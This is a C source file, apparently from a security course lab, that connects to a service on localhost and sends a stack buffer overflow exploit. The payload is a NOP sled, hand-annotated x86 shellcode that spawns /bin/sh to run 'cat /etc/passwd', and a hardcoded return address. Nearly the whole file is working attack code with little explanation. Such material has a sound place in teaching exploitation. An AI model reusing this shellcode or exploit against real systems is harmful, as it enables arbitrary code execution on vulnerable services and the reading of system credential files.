#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE *outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

/*char compromise[130] = {
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x','x','x','x','x','x','x','x','x', 
    'x','x', 'x', 'W', 'W', 'Y', 'Z', '\n'
    
};*/

char compromise[130] = {
  // 26 This is the number of nops required for padding
    // This is so the new return address is alligned with the existing return address
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    
    // 104 binary - This is the binary code from the overflow.lst file
    0x90,                       //nop
    0x90,                       //nop
    0xeb, 0x29,                 //start: 	 jmp short codeEnd
    0x5e,                       //start2:  pop esi
    0x31, 0xc0,                 //xor eax,eax
    0x88, 0x46, 0x07,           //mov [byte esi+flagStr-exeStr-2],al 		; move one null byte to end of bin/sh
    0x88, 0x46, 0x0b,           //mov [byte esi+cmdStr-exeStr-1],al		; move one null byte to end of -c
    0x88, 0x46, 0x20,           //mov [byte esi+arrayAddr-exeStr-1],al	; move one null byte to end of shell command
    0x89, 0x46, 0x2d,           //mov [byte esi+arrayAddr-exeStr+12],eax	; move null word to end of array
    0x89, 0x76, 0x21,           //mov [byte esi+arrayAddr-exeStr],esi	; stores exeStr
    0x8d, 0x7e, 0x09,           //lea edi,[byte esi+flagStr-exeStr]	; stores the address of '-c'
    0x89, 0x7e, 0x25,           //mov [byte esi+arrayAddr-exeStr+4],edi
    0x8d, 0x7e, 0x0c,           //lea edi,[byte esi+cmdStr-exeStr]	
    0x89, 0x7e, 0x29,           //mov [byte esi+arrayAddr-exeStr+8],edi
    0xb0, 0x0b,                 //mov al,0x0b
    0x89, 0xf3,                 //mov ebx, esi
    0x8d, 0x4e, 0x21,           //lea ecx, [byte esi+arrayAddr-exeStr]
    0x31, 0xd2,                 //xor edx,edx
    0xcd, 0x80,                 //int 0x80
    0xe8, 0xd2, 0xff, 0xff, 0xff,                           //codeEnd: call start2
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58, 0x79,   //exeStr:	 db "/bin/shXy"
    0x2d, 0x63, 0x58,                                       //flagStr	 db "-cX"
    0x63, 0x61, 0x74, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x65, 0x78, 0x69, 0x74, 0x58,    //cmdStr	 db "cat /etc/passwd;exitX"
    0xff, 0xff, 0xff, 0xff,                                 //arrayAddr: dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    // return address 0xbffff810  -4 - 61
    0xab, 0xf7, 0xff, 0xbf,                                 //newAddr:   dd newAddr-start
    //'W','X','Y','Z',
    // null byte
    0x0a,0x00

  // hex code with calculated return address
    
};

void Attack(FILE *outfile){
    fprintf(outfile,compromise);
    fflush(outfile);
}



